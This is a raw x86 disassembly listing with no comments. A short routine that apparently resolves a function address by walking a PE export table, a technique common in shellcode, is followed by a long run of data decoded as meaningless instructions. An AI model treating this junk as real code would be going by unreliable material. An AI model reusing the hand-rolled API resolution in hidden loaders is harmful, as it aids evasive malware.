  41956a:	int3   
  41956b:	int3   
  41956c:	int3   
  41956d:	int3   
  41956e:	int3   
  41956f:	int3   
  419570:	mov    ecx,0x24
  419575:	add    esi,ecx
  419577:	mov    ecx,DWORD PTR [esi]
  419579:	shl    eax,1
  41957b:	add    ecx,eax
  41957d:	mov    eax,DWORD PTR [ebp-0x4]
  419580:	add    ecx,eax
  419582:	movzx  eax,WORD PTR [ecx]
  419585:	sub    esi,0x24
  419588:	mov    ecx,DWORD PTR [esi+0x1c]
  41958b:	lea    eax,[ecx+eax*4]
  41958e:	mov    ecx,DWORD PTR [ebp-0x4]
  419591:	mov    eax,DWORD PTR [ecx+eax*1]
  419594:	ret    
  419595:	int3   
  419596:	int3   
  419597:	int3   
  419598:	int3   
  419599:	int3   
  41959a:	int3   
  41959b:	int3   
  41959c:	int3   
  41959d:	int3   
  41959e:	int3   
  41959f:	int3   
  4195a0:	(bad)  
  4195a1:	int3   
  4195a2:	inc    eax
  4195a3:	add    eax,0x40004041
  4195a8:	inc    ecx
  4195a9:	int3   
  4195aa:	add    BYTE PTR [ebx-0x7c],al
  4195ad:	add    eax,0x5406240
  4195b2:	bound  ebp,QWORD PTR [ecx+0x52]
  4195b5:	xor    ecx,DWORD PTR [edi+ecx*2-0x37]
  4195b9:	cld    
  4195ba:	shr    BYTE PTR [esi+0x53],1
  4195bd:	pop    ebp
  4195be:	sub    edx,esp
  4195c0:	inc    ecx
  4195c1:	cmp    edi,esp
  4195c3:	xor    edx,DWORD PTR [edx+0x65]
  4195c6:	cmp    eax,0xaa88a977
  4195cb:	push   esp
  4195cc:	cmc    
  4195cd:	adc    BYTE PTR [ecx+0xb63c362],bh
  4195d3:	mov    bl,0x40
  4195d5:	ins    BYTE PTR es:[edi],dx
  4195d6:	inc    eax
  4195d7:	bound  ebx,QWORD PTR [eax+0x41]
  4195da:	add    eax,0x40404340
  4195df:	inc    ebx
  4195e0:	inc    eax
  4195e1:	test   BYTE PTR [eax],al
  4195e3:	add    eax,0x40624041
  4195e8:	inc    eax
  4195e9:	add    BYTE PTR [edx+0x5],ah
  4195ec:	inc    ebx
  4195ed:	add    BYTE PTR [eax+0x78],al
  4195f0:	inc    ecx
  4195f1:	add    BYTE PTR [eax+0x41],bl
  4195f4:	bound  ebp,QWORD PTR [ecx-0x303ab358]
  4195fa:	sti    
  4195fb:	adc    DWORD PTR [edx+0x29],edx
  4195fe:	or     eax,0x75176744
  419603:	inc    esp
  419604:	lds    edi,FWORD PTR [esi]
  419606:	leave  
  419607:	rcl    BYTE PTR [ebp-0xeae4cd2],cl
  41960d:	retf   
  41960e:	xchg   ecx,eax
  41960f:	mov    al,0x2b
  419611:	leave  
  419612:	pop    esp
  419613:	mov    edi,0x62b31205
  419618:	hlt    
  419619:	jmp    0x4ca6d8f5
  41961e:	push   ebx
  41961f:	inc    eax
  419620:	test   BYTE PTR [eax],al
  419622:	int3   
  419623:	bound  eax,QWORD PTR ds:0xcc840f41
  419629:	inc    ebx
  41962a:	add    BYTE PTR [eax+0x0],al
  41962d:	inc    eax
  41962e:	inc    eax
  41962f:	inc    eax
  419630:	int3   
  419631:	add    BYTE PTR ds:0x62404341,al
  419637:	pop    eax
  419638:	add    BYTE PTR [ebx+0x40],al
  41963b:	bound  ecx,QWORD PTR [edi]
  41963d:	inc    eax
  41963e:	leave  
  41963f:	arpl   WORD PTR [ecx+0x76],cx
  419642:	fwait
  419643:	adc    BYTE PTR ds:0x110942cb,dl
  419649:	mov    dl,0x4a
  41964b:	ins    BYTE PTR es:[edi],dx
  41964c:	retf   
  41964d:	and    eax,0x68d18080
  419652:	adc    dl,BYTE PTR [edx+0x0]
  419655:	test   eax,0xa53519
  41965a:	add    BYTE PTR [eax+0x40],al
  41965d:	cmovno eax,DWORD PTR ds:0x40056243
  419664:	int3   
  419665:	add    ah,cl
  419667:	inc    eax
  419668:	inc    eax
  419669:	bound  eax,QWORD PTR [ecx+0x0]
  41966c:	add    BYTE PTR [edi],cl
  41966e:	inc    ebx
  41966f:	inc    eax
  419670:	inc    eax
  419671:	add    BYTE PTR [ecx+0x43],al
  419674:	add    eax,0x40256240
  419679:	bound  eax,QWORD PTR [eax]
  41967b:	dec    ebp
  41967c:	xor    edi,DWORD PTR [edx+ebp*1+0x620bf52]
  419683:	aad    0x4b
  419685:	add    BYTE PTR [eax-0x7a],0x62
  419689:	bound  esp,QWORD PTR [esi]
  41968b:	dec    ebp
  41968c:	icebp  
  41968d:	cli    
  41968e:	inc    ebp
  41968f:	in     al,0x52
  419691:	int    0x94
  419693:	fild   WORD PTR [edi]
  419695:	adc    BYTE PTR [ebx],ah
  419697:	push   edx
  419698:	xor    al,0x7b
  41969a:	sub    al,0x4d
  41969c:	mov    cl,0x6d
  41969e:	lock retf 
  4196a0:	add    BYTE PTR [ebp+0x5241dfdd],al
  4196a6:	bound  edx,QWORD PTR [edx-0x5e]
  4196a9:	xor    eax,0x5f174036
  4196ae:	add    eax,0x6214c3ab
  4196b3:	push   ebp
  4196b4:	add    eax,0x4140cc00
  4196b9:	inc    eax
  4196ba:	inc    ebx
  4196bb:	bound  esp,QWORD PTR ds:0x41400043
  4196c1:	add    BYTE PTR [eax],al
  4196c3:	add    eax,0x43624062
  4196c8:	inc    ecx
  4196c9:	inc    eax
  4196ca:	inc    eax
  4196cb:	inc    eax
  4196cc:	add    eax,0x40624340
  4196d1:	add    eax,0x40664140
  4196d6:	push   ds
  4196d7:	mov    al,ds:0x6342bc87
  4196dc:	leave  
  4196dd:	scas   eax,DWORD PTR es:[edi]
  4196de:	icebp  
  4196df:	adc    BYTE PTR [ecx+eax*2+0x56516c4e],bh
  4196e6:	inc    edi
  4196e7:	ins    BYTE PTR es:[edi],dx
  4196e8:	mov    ?,ebp
  4196ea:	cmp    ah,ah
  4196ec:	mov    cl,0xdf
  4196ee:	xchg   ecx,eax
  4196ef:	push   edx
  4196f0:	inc    eax
  4196f1:	mov    al,ds:0x4e4c351d
  4196f6:	lahf   
  4196f7:	arpl   WORD PTR [ecx],dx
  4196f9:	arpl   WORD PTR [eax+0x45b5be14],bx
  4196ff:	inc    ebx
  419700:	add    BYTE PTR ds:0x41107840,al
  419706:	bound  eax,QWORD PTR [eax+0x40]
  419709:	sldt   WORD PTR [eax-0x34]
  41970d:	js     0x419771
  41970f:	add    eax,0x40664143
  419714:	inc    ebx
  419715:	add    BYTE PTR [ecx+0x5],al
  419718:	js     0x41975a
  41971a:	bound  eax,QWORD PTR [eax+0x0]
  41971d:	inc    eax
  41971e:	sub    al,0x5d
  419720:	mov    al,ds:0x40ab6362
  419725:	xor    ah,BYTE PTR [esi+0x62]
  419728:	inc    ecx
  419729:	lds    edx,FWORD PTR [ecx-0x42]
  41972c:	xor    DWORD PTR ds:0x4fb90510,ebp
  419732:	pushf  
  419733:	jno    0x41975e
  419735:	dec    ebp
  419736:	ins    BYTE PTR es:[edi],dx
  419737:	xchg   DWORD PTR [eax-0x22cabc],eax
  41973d:	repz push edx
  41973f:	cmp    ch,BYTE PTR [eax+0x433c1440]
  419745:	jle    0x419788
  419747:	inc    ebx
  419748:	inc    eax
  419749:	inc    eax
  41974a:	add    eax,0x434162
  41974f:	inc    eax
  419750:	add    BYTE PTR [edx+0x5],ah
  419753:	inc    eax
  419754:	adc    BYTE PTR [edx+0x40],ah
  419757:	inc    ebx
  419758:	inc    ecx
  419759:	add    eax,0x4340
  41975e:	add    eax,0x404162
  419763:	add    BYTE PTR [eax+0x43],al
  419766:	inc    eax
  419767:	add    eax,0xfb1196d5
  41976c:	arpl   WORD PTR [eax],bp
  41976e:	mov    edi,0x4c6dd499
  419773:	addr16 dec eax
  419775:	shr    BYTE PTR [edx],cl
  419777:	push   esp
  419778:	pop    ecx
  419779:	nop
  41977a:	inc    ecx
  41977b:	dec    ecx
  41977c:	pushf  
  41977d:	pop    edi
  41977e:	pop    edi
  41977f:	ss bound eax,QWORD PTR gs:[ecx+ebp*4+0x2b7eca35]
  419788:	xor    eax,0x14505498
  41978d:	sar    bh,1
  41978f:	bound  ecx,QWORD PTR [ebx+ecx*2-0x149c36ad]
  419796:	rcl    edx,0x52
  419799:	leave  
  41979a:	push   esi
  41979b:	(bad)
  41979f:	aaa    
  4197a0:	arpl   WORD PTR [eax+0x0],ax
  4197a3:	add    BYTE PTR [ecx+0x43],al
  4197a6:	add    eax,0x41784062
  4197ab:	inc    eax
  4197ac:	inc    eax
  4197ad:	add    BYTE PTR [edi],cl
  4197af:	bound  eax,QWORD PTR [ebx+0x0]
  4197b2:	add    eax,0x25006240
  4197b7:	inc    eax
  4197b8:	add    eax,0x40254143
  4197bd:	add    eax,0x2f620000
  4197c2:	pop    esp
  4197c3:	mov    al,0x77
  4197c5:	scas   eax,DWORD PTR es:[edi]
  4197c6:	mov    edi,0x54c42cfa
  4197cb:	add    eax,0xd614ced
  4197d0:	arpl   WORD PTR [edi-0x71],cx
  4197d3:	retf   
  4197d4:	xor    eax,0x4373bf61
  4197d9:	add    BYTE PTR [eax],al
  4197db:	add    BYTE PTR [ecx+0x40],al
  4197de:	bound  esp,QWORD PTR [esi+0x0]
  4197e1:	inc    eax
  4197e2:	add    eax,0x5400000
  4197e7:	inc    ecx
  4197e8:	inc    eax
  4197e9:	inc    eax
  4197ea:	bound  esp,QWORD PTR ds:0x25050043
  4197f0:	inc    ecx
  4197f1:	inc    ebx
  4197f2:	inc    eax
  4197f3:	test   BYTE PTR [eax+0x0],al
  4197f6:	bound  ebx,QWORD PTR [eax+0x62]
  4197f9:	inc    ecx
  4197fa:	inc    eax
  4197fb:	xor    eax,0x1450a8bf
  419800:	aam    0x3
  419802:	inc    eax
  419803:	cwde   
  419804:	test   al,0x60
  419806:	mov    edx,0xd1dfd864
  41980b:	push   edx
  41980c:	cmp    eax,0x4b6b816e
  419811:	adc    BYTE PTR [edx+0x40],ah
  419814:	inc    ecx
  419815:	and    eax,0x40000500
  41981a:	inc    ebx
  41981b:	add    eax,0x40624041
  419820:	inc    ebx
  419821:	add    eax,0x43402541
  419826:	bound  eax,QWORD PTR [eax+0x43]
  419829:	int3   
  41982a:	inc    eax
  41982b:	bound  eax,QWORD PTR [eax]
  41982d:	inc    ecx
  41982e:	inc    eax
  41982f:	inc    eax
  419830:	add    eax,0x65435205
  419835:	ret    
  419836:	bound  esi,QWORD PTR [eax+edi*8+0x5cf31351]
  41983d:	test   al,0xa7
  41983f:	dec    ecx
  419840:	xor    eax,0x666e6042
  419845:	add    eax,0xe51414f4
  41984a:	xor    esi,ebp
  41984c:	xor    eax,0x641065c9
  419851:	jp     0x4198be
  419853:	jg     0x4197ed
  419855:	xchg   ecx,eax
  419856:	mov    eax,ds:0xd1a77663
  41985b:	xchg   edx,eax
  41985c:	push   edx
  41985d:	dec    eax
  41985e:	cmp    al,0x54
  419860:	hlt    
  419861:	xor    BYTE PTR [ecx+0x2e],ah
  419864:	arpl   WORD PTR [ecx],bp
  419866:	push   ebp
  419867:	int3   
  419868:	xor    eax,0xbc021186
  41986d:	bound  eax,QWORD PTR [eax+0x25]
  419870:	add    BYTE PTR [esi+0x40],ah
  419873:	add    eax,0x40404143
  419878:	inc    ebx
  419879:	add    BYTE PTR [eax],al
  41987b:	add    BYTE PTR [edx-0x34],ah
  41987e:	inc    eax
  41987f:	add    eax,0x40004041
  419884:	inc    ecx
  419885:	int3   
  419886:	add    BYTE PTR [ebx-0x7c],al
  419889:	add    eax,0x5406240
  41988e:	(bad)  
  41988f:	aam    0x4c
  419891:	adc    DWORD PTR [ecx+ecx*4],0xc835130f
  419898:	js     0x4198fc
  41989a:	arpl   sp,ax
  41989c:	adc    al,0x46
  41989e:	cwde   
  41989f:	inc    ebx
  4198a0:	push   ebx
  4198a1:	jae    0x419868
  4198a3:	sub    eax,0x3d52d332
  4198a8:	mov    edi,0xbec06ba0
  4198ad:	mov    ebx,0x628820b7
  4198b2:	loope  0x41992d
  4198b4:	dec    esi
  4198b5:	inc    ebp
  4198b6:	mov    esp,0x3450c3a8
  4198bb:	jae    0x4198d1
  4198bd:	jbe    0x4198f4
  4198bf:	adc    BYTE PTR [ecx],dh
  4198c1:	inc    eax
  4198c2:	bound  ebx,QWORD PTR [eax+0x41]
  4198c5:	add    eax,0x40404340
  4198ca:	inc    ebx
  4198cb:	inc    eax
  4198cc:	test   BYTE PTR [eax],al
  4198ce:	add    eax,0x40624041
  4198d3:	inc    eax
  4198d4:	add    BYTE PTR [edx+0x5],ah
  4198d7:	inc    ebx
  4198d8:	add    BYTE PTR [eax+0x78],al
  4198db:	inc    ecx
  4198dc:	add    BYTE PTR [eax+0x41],bl
  4198df:	bound  esp,QWORD PTR [eax+0x6cc70574]
  4198e5:	cwde   
  4198e6:	dec    eax
  4198e7:	add    DWORD PTR [ecx+0x40ffbf62],0x52
  4198ee:	inc    ecx
  4198ef:	mov    ch,0x42
  4198f1:	or     dh,cl
  4198f3:	push   ss
  4198f4:	and    al,0x5a
  4198f6:	das    
  4198f7:	mov    esp,0x8440d5f7
  4198fc:	add    ah,cl
  4198fe:	bound  eax,QWORD PTR ds:0xcc840f41
  419904:	inc    ebx
  419905:	add    BYTE PTR [eax+0x0],al
  419908:	inc    eax
  419909:	inc    eax
  41990a:	inc    eax
  41990b:	int3   
  41990c:	add    BYTE PTR ds:0x62404341,al
  419912:	pop    eax
  419913:	add    BYTE PTR [ebx+0x40],al
  419916:	bound  ecx,QWORD PTR [edi]
  419918:	inc    eax
  419919:	inc    edx
  41991a:	adc    esp,DWORD PTR [edx-0x64]
  41991d:	test   al,0x64
  41991f:	dec    edi
  419920:	jne    0x41999c
  419922:	jnp    0x4198d5
  419924:	push   esi
  419925:	jle    0x4198d3
  419927:	mov    al,0xfe
  419929:	push   ebx
  41992a:	inc    eax
  41992b:	inc    esi
  41992c:	sub    al,0xa4
  41992e:	ret    
  41992f:	adc    eax,0x11501135
  419934:	add    BYTE PTR [eax],al
  419936:	inc    eax
  419937:	inc    eax
  419938:	cmovno eax,DWORD PTR ds:0x40056243
  41993f:	int3   
  419940:	add    ah,cl
  419942:	inc    eax
  419943:	inc    eax
  419944:	bound  eax,QWORD PTR [ecx+0x0]
  419947:	add    BYTE PTR [edi],cl
  419949:	inc    ebx
  41994a:	inc    eax
  41994b:	inc    eax
  41994c:	add    BYTE PTR [ecx+0x43],al
  41994f:	add    eax,0x40256240
  419954:	bound  eax,QWORD PTR [eax]
  419956:	push   ds
  419957:	arpl   WORD PTR [ecx-0x35],ax
  41995a:	adc    al,0x63
  41995c:	ja     0x419933
  41995e:	dec    eax
  41995f:	pop    edx
  419960:	(bad)  
  419961:	data16 fst DWORD PTR fs:[ebx]
  419965:	xor    DWORD PTR [ebp+0x5b357a2c],edi
  41996b:	push   esi
  41996c:	jnp    0x4199ea
  41996e:	xor    eax,0xf441a892
  419973:	pop    esi
  419974:	inc    esp
  419975:	push   ecx
  419976:	cwde   
  419977:	inc    edx
  419978:	dec    ebp
  419979:	mov    ecx,0xcf1d7535
  41997e:	add    eax,0x4140cc00
  419983:	inc    eax
  419984:	inc    ebx
  419985:	bound  esp,QWORD PTR ds:0x41400043
  41998b:	add    BYTE PTR [eax],al
  41998d:	add    eax,0x43624062
  419992:	inc    ecx
  419993:	inc    eax
  419994:	inc    eax
  419995:	inc    eax
  419996:	add    eax,0x40624340
  41999b:	add    eax,0x40664140
  4199a0:	push   edx
  4199a1:	xor    eax,0x5c14c39d
  4199a6:	fwait
  4199a7:	popa   
  4199a8:	pop    edx
  4199a9:	cmp    BYTE PTR [edx],0xbc
  4199ac:	fs jb  0x4199c3
  4199af:	jno    0x41996d
  4199b1:	ror    BYTE PTR [ebp+0xd],1
  4199b4:	jne    0x419994
  4199b6:	aad    0x6b
  4199b8:	add    eax,0xe4f7bd42
  4199bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199be:	inc    ebp
  4199bf:	icebp  
  4199c0:	fs and DWORD PTR ss:[edi+0x35],ecx
  4199c5:	xchg   esp,eax
  4199c6:	xlat   BYTE PTR ds:[ebx]
  4199c7:	inc    ebx
  4199c8:	(bad)  
  4199c9:	rol    BYTE PTR [ecx+0x40],0x14
  4199cd:	mov    al,ds:0x36c550cc
  4199d2:	std    
  4199d3:	inc    ebx
  4199d4:	add    BYTE PTR ds:0x41107840,al
  4199da:	bound  eax,QWORD PTR [eax+0x40]
  4199dd:	sldt   WORD PTR [eax-0x34]
  4199e1:	js     0x419a45
  4199e3:	add    eax,0x40664143
  4199e8:	inc    ebx
  4199e9:	add    BYTE PTR [ecx+0x5],al
  4199ec:	js     0x419a2e
  4199ee:	bound  eax,QWORD PTR [eax+0x0]
  4199f1:	inc    eax
  4199f2:	inc    eax
  4199f3:	fs mov esi,0xd9dc361f
  4199f9:	dec    ecx
  4199fa:	inc    edx
  4199fb:	je     0x4199f7
  4199fd:	push   cs
  4199fe:	inc    ebp
  4199ff:	leave  
  419a00:	pusha  
  419a01:	pusha  
  419a02:	js     0x4199fc
  419a04:	loopne 0x419a16
  419a06:	jb     0x419a6d
  419a08:	sub    ch,BYTE PTR [edx+0x797133a9]
  419a0e:	xor    dh,BYTE PTR ds:0xe4504de0
  419a14:	mov    ds:0x5987140,eax
  419a19:	popf   
  419a1a:	inc    ecx
  419a1b:	inc    ebx
  419a1c:	inc    eax
  419a1d:	inc    eax
  419a1e:	add    eax,0x434162
  419a23:	inc    eax
  419a24:	add    BYTE PTR [edx+0x5],ah
  419a27:	inc    eax
  419a28:	adc    BYTE PTR [edx+0x40],ah
  419a2b:	inc    ebx
  419a2c:	inc    ecx
  419a2d:	add    eax,0x4340
  419a32:	add    eax,0x404162
  419a37:	add    BYTE PTR [eax+0x43],al
  419a3a:	inc    eax
  419a3b:	add    eax,0x77bf6246
  419a40:	rcl    DWORD PTR [edx-0x37],1
  419a43:	cmp    al,BYTE PTR [eax+0x2]
  419a46:	and    cl,ah
  419a48:	pop    esi
  419a49:	aad    0x90
  419a4b:	dec    ebp
  419a4c:	enter  0x65cd,0x59
  419a50:	push   ecx
  419a51:	rol    BYTE PTR [ebx-0x43],0xec
  419a55:	fs dec edx
  419a57:	mov    cl,0xab
  419a59:	push   ecx
  419a5a:	push   ecx
  419a5b:	and    DWORD PTR [ebx-0xa],esp
  419a5e:	test   al,0x11
  419a60:	imul   edx,DWORD PTR [ebp+0x38],0xc8154d
  419a67:	stc    
  419a68:	xchg   ecx,eax
  419a69:	xor    eax,0x4843fdfc
  419a6e:	inc    eax
  419a6f:	add    BYTE PTR [eax],al
  419a71:	inc    ecx
  419a72:	inc    ebx
  419a73:	add    eax,0x41784062
  419a78:	inc    eax
  419a79:	inc    eax
  419a7a:	add    BYTE PTR [edi],cl
  419a7c:	bound  eax,QWORD PTR [ebx+0x0]
  419a7f:	add    eax,0x25006240
  419a84:	inc    eax
  419a85:	add    eax,0x40254143
  419a8a:	add    eax,0xb3620000
  419a8f:	adc    DWORD PTR [ebx-0x68],eax
  419a92:	dec    esp
  419a93:	and    ebp,DWORD PTR [ecx]
  419a95:	fs xchg esi,eax
  419a97:	push   DWORD PTR [edx-0x39233eae]
  419a9d:	fs pushf 
  419a9f:	adc    DWORD PTR [esi],esi
  419aa1:	int    0xd6
  419aa3:	inc    eax
  419aa4:	push   edx
  419aa5:	call   0xcd879a3e
  419aaa:	bound  esi,QWORD PTR [ebp+esi*1-0x2eb9dc08]
  419ab1:	in     eax,dx
  419ab2:	outs   dx,BYTE PTR gs:[esi]
  419ab4:	dec    edx
  419ab5:	(bad)  
  419ab6:	rcr    BYTE PTR [edi+0x50],1
  419ab9:	push   ecx
  419aba:	inc    ebx
  419abb:	add    BYTE PTR [eax],al
  419abd:	add    BYTE PTR [ecx+0x40],al
  419ac0:	bound  esp,QWORD PTR [esi+0x0]
  419ac3:	inc    eax
  419ac4:	add    eax,0x5400000
  419ac9:	inc    ecx
  419aca:	inc    eax
  419acb:	inc    eax
  419acc:	bound  esp,QWORD PTR ds:0x25050043
  419ad2:	inc    ecx
  419ad3:	inc    ebx
  419ad4:	inc    eax
  419ad5:	test   BYTE PTR [eax+0x0],al
  419ad8:	bound  ebx,QWORD PTR [eax+0x62]
  419adb:	inc    ecx
  419adc:	inc    eax
  419add:	arpl   bx,cx
  419adf:	mov    eax,0x33134fbd
  419ae4:	cmp    al,0xa7
  419ae6:	es ret 
  419ae8:	arpl   bp,bx
  419aea:	mov    ch,0x7b
  419aec:	adc    al,0xc0
  419aee:	dec    eax
  419aef:	inc    edx
  419af0:	cmp    dh,BYTE PTR [edx+edx*2]
  419af3:	fild   QWORD PTR [edx+0x41406210]
  419af9:	and    eax,0x40000500
  419afe:	inc    ebx
  419aff:	add    eax,0x40624041
  419b04:	inc    ebx
  419b05:	add    eax,0x43402541
  419b0a:	bound  eax,QWORD PTR [eax+0x43]
  419b0d:	int3   
  419b0e:	inc    eax
  419b0f:	bound  eax,QWORD PTR [eax]
  419b11:	inc    ecx
  419b12:	inc    eax
  419b13:	inc    eax
  419b14:	add    eax,0x6c050805
  419b19:	clc    
  419b1a:	stos   BYTE PTR es:[edi],al
  419b1b:	shr    DWORD PTR [ecx-0x53],1
  419b1e:	ins    BYTE PTR es:[edi],dx
  419b1f:	leave  
  419b20:	cmp    BYTE PTR [ebx+ebp*4+0x3e],ah
  419b24:	shl    DWORD PTR ds:0xc7492662,1
  419b2a:	nop
  419b2b:	push   ecx
  419b2c:	je     0x419ac6
  419b2e:	bound  eax,QWORD PTR [eax+0x25]
  419b31:	add    BYTE PTR [esi+0x40],ah
  419b34:	add    eax,0x40404143
  419b39:	inc    ebx
  419b3a:	add    BYTE PTR [eax],al
  419b3c:	add    BYTE PTR [edx-0x34],ah
  419b3f:	inc    eax
  419b40:	add    eax,0x40004041
  419b45:	inc    ecx
  419b46:	int3   
  419b47:	add    BYTE PTR [ebx-0x7c],al
  419b4a:	add    eax,0x5406240
  419b4f:	bound  eax,QWORD PTR [eax+eiz*2+0x34]
  419b53:	mov    esp,0x52d540af
  419b58:	test   eax,0xf0644380
  419b5d:	mov    cl,0x9f
  419b5f:	bound  ebp,QWORD PTR [ecx-0x75d6453d]
  419b65:	mov    edi,0x48bc9c64
  419b6a:	ret    
  419b6b:	xchg   esp,eax
  419b6c:	pop    edi
  419b6d:	cmp    esi,ecx
  419b6f:	inc    cx
  419b71:	add    eax,0x58624042
  419b76:	inc    ecx
  419b77:	add    eax,0x40404340
  419b7c:	inc    ebx
  419b7d:	inc    eax
  419b7e:	test   BYTE PTR [eax],al
  419b80:	add    eax,0x40624041
  419b85:	inc    eax
  419b86:	add    BYTE PTR [edx+0x5],ah
  419b89:	inc    ebx
  419b8a:	add    BYTE PTR [eax+0x78],al
  419b8d:	inc    ecx
  419b8e:	add    BYTE PTR [eax+0x41],bl
  419b91:	bound  edi,QWORD PTR [edx+0x354276b8]
  419b97:	test   al,0xf7
  419b99:	or     al,al
  419b9b:	mov    ch,BYTE PTR [edx+0x4fd898f2]
  419ba1:	xor    al,0x91
  419ba3:	outs   dx,BYTE PTR ds:[esi]
  419ba4:	pop    edx
  419ba5:	and    al,0x52
  419ba7:	inc    esp
  419ba8:	dec    ebx
  419ba9:	mov    ds:0x65311263,al
  419bae:	int    0x39
  419bb0:	aas    
  419bb1:	clc    
  419bb2:	mov    eax,0x23715efb
  419bb7:	ret    
  419bb8:	sbb    ah,BYTE PTR [edx+0x4d]
  419bbb:	lods   eax,DWORD PTR ds:[esi]
  419bbc:	xor    DWORD PTR [edx+0x40],eax
  419bbf:	test   BYTE PTR [eax],al
  419bc1:	int3   
  419bc2:	bound  eax,QWORD PTR ds:0xcc840f41
  419bc8:	inc    ebx
  419bc9:	add    BYTE PTR [eax+0x0],al
  419bcc:	inc    eax
  419bcd:	inc    eax
  419bce:	inc    eax
  419bcf:	int3   
  419bd0:	add    BYTE PTR ds:0x62404341,al
  419bd6:	pop    eax
  419bd7:	add    BYTE PTR [ebx+0x40],al
  419bda:	bound  ecx,QWORD PTR [edi]
  419bdc:	inc    eax
  419bdd:	or     DWORD PTR [edx+edi*4+0x4c],ecx
  419be1:	lods   eax,DWORD PTR ds:[esi]
  419be2:	jmp    0xd972ceb
  419be7:	ret    
  419be8:	mov    ecx,0x41f24bb6
  419bed:	xor    eax,0x50814842
  419bf2:	xchg   esp,eax
  419bf3:	sub    DWORD PTR [ecx-0x68],esi
  419bf6:	imul   edx,DWORD PTR ds:0x320b943,0x78
  419bfd:	push   edx
  419bfe:	dec    esp
  419bff:	mul    DWORD PTR [edi]
  419c01:	mov    ah,0x5b
  419c03:	rcl    DWORD PTR [ecx+0x124f6203],cl
  419c09:	pop    ds
  419c0a:	add    BYTE PTR [eax],al
  419c0c:	inc    eax
  419c0d:	inc    eax
  419c0e:	cmovno eax,DWORD PTR ds:0x40056243
  419c15:	int3   
  419c16:	add    ah,cl
  419c18:	inc    eax
  419c19:	inc    eax
  419c1a:	bound  eax,QWORD PTR [ecx+0x0]
  419c1d:	add    BYTE PTR [edi],cl
  419c1f:	inc    ebx
  419c20:	inc    eax
  419c21:	inc    eax
  419c22:	add    BYTE PTR [ecx+0x43],al
  419c25:	add    eax,0x40256240
  419c2a:	bound  eax,QWORD PTR [eax]
  419c2c:	mov    BYTE PTR [esi+0x76],dl
  419c2f:	lods   al,BYTE PTR ds:[esi]
  419c30:	js     0x419c86
  419c32:	mov    esp,0x7257e3bd
  419c37:	xor    eax,0xb2633cc3
  419c3c:	daa    
  419c3d:	sti    
  419c3e:	lahf   
  419c3f:	cwde   
  419c40:	dec    esp
  419c41:	add    DWORD PTR [eax+0x50],ecx
  419c44:	imul   ecx,DWORD PTR [edx+0x35],0x52
  419c48:	push   0x1eb91547
  419c4d:	xor    BYTE PTR [esi+edx*2-0x55],dh
  419c51:	inc    eax
  419c52:	inc    ebx
  419c53:	mov    al,0x73
  419c55:	xor    dh,BYTE PTR [ebx]
  419c57:	lods   al,BYTE PTR ds:[esi]
  419c58:	bound  eax,QWORD PTR [esi-0x48]
  419c5b:	or     eax,0x35680998
  419c60:	inc    ebp
  419c61:	sub    BYTE PTR ds:0x51176c6,dl
  419c67:	add    ah,cl
  419c69:	inc    eax
  419c6a:	inc    ecx
  419c6b:	inc    eax
  419c6c:	inc    ebx
  419c6d:	bound  esp,QWORD PTR ds:0x41400043
  419c73:	add    BYTE PTR [eax],al
  419c75:	add    eax,0x43624062
  419c7a:	inc    ecx
  419c7b:	inc    eax
  419c7c:	inc    eax
  419c7d:	inc    eax
  419c7e:	add    eax,0x40624340
  419c83:	add    eax,0x40664140
  419c88:	mov    ch,0x98
  419c8a:	inc    edx
  419c8b:	div    edi
  419c8d:	pop    esi
  419c8e:	(bad)  
  419c8f:	push   edx
  419c90:	dec    ebx
  419c91:	push   edx
  419c92:	test   eax,0x3654f4f
  419c97:	xchg   ecx,eax
  419c98:	mov    bl,0x65
  419c9a:	mov    esp,0xf2aeb861
  419c9f:	sbb    BYTE PTR [edx+0x5c],cl
  419ca2:	inc    ecx
  419ca3:	ror    BYTE PTR ds:0x40050043,1
  419ca9:	js     0x419cbb
  419cab:	inc    ecx
  419cac:	bound  eax,QWORD PTR [eax+0x40]
  419caf:	sldt   WORD PTR [eax-0x34]
  419cb3:	js     0x419d17
  419cb5:	add    eax,0x40664143
  419cba:	inc    ebx
  419cbb:	add    BYTE PTR [ecx+0x5],al
  419cbe:	js     0x419d00
  419cc0:	bound  eax,QWORD PTR [eax+0x0]
  419cc3:	inc    eax
  419cc4:	pop    edx
  419cc5:	sbb    BYTE PTR [edx],0xf5
  419cc8:	push   cx
  419cca:	daa    
  419ccb:	leave  
  419ccc:	mov    ebp,0x35494100
  419cd1:	js     0x419d47
  419cd3:	lods   al,BYTE PTR es:[esi]
  419cd5:	mov    ?,WORD PTR [edi+0x1e]
  419cd8:	cwde   
  419cd9:	imul   esp,eax,0x40
  419cdc:	push   esp
  419cdd:	cli    
  419cde:	or     dl,BYTE PTR [edx+edx*2]
  419ce1:	sub    al,0x62
  419ce3:	inc    eax
  419ce4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ce5:	(bad)  
  419ce6:	pop    ds
  419ce7:	inc    eax
  419ce8:	mov    esp,0xaa4f052c
  419ced:	cmc    
  419cee:	aam    0x51
  419cf0:	test   al,0xbf
  419cf2:	idiv   DWORD PTR [edi+0x3dff1e4d]
  419cf8:	xor    eax,0x40404341
  419cfd:	add    eax,0x434162
  419d02:	inc    eax
  419d03:	add    BYTE PTR [edx+0x5],ah
  419d06:	inc    eax
  419d07:	adc    BYTE PTR [edx+0x40],ah
  419d0a:	inc    ebx
  419d0b:	inc    ecx
  419d0c:	add    eax,0x4340
  419d11:	add    eax,0x404162
  419d16:	add    BYTE PTR [eax+0x43],al
  419d19:	inc    eax
  419d1a:	add    eax,0xada145bc
  419d1f:	inc    ebp
  419d20:	inc    DWORD PTR [eax+ebx*4+0x5]
  419d24:	shr    DWORD PTR ds:[eax+0x52396e92],0x87
  419d2c:	inc    eax
  419d2d:	dec    eax
  419d2e:	inc    esi
  419d2f:	fs stos DWORD PTR es:[edi],eax
  419d31:	jne    0x419d08
  419d33:	and    BYTE PTR [edi+esi*8-0xa5a094b],ch
  419d3a:	ret    0x7c42
  419d3d:	dec    edi
  419d3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d3f:	outs   dx,BYTE PTR ds:[si]
  419d41:	jne    0x419d6c
  419d43:	leave  
  419d44:	cmp    al,0x50
  419d46:	adc    eax,0x65ffa389
  419d4b:	fmul   QWORD PTR [edx]
  419d4d:	inc    ebx
  419d4e:	cmp    BYTE PTR [esi+0x5d357537],cl
  419d54:	inc    eax
  419d55:	add    BYTE PTR [eax],al
  419d57:	inc    ecx
  419d58:	inc    ebx
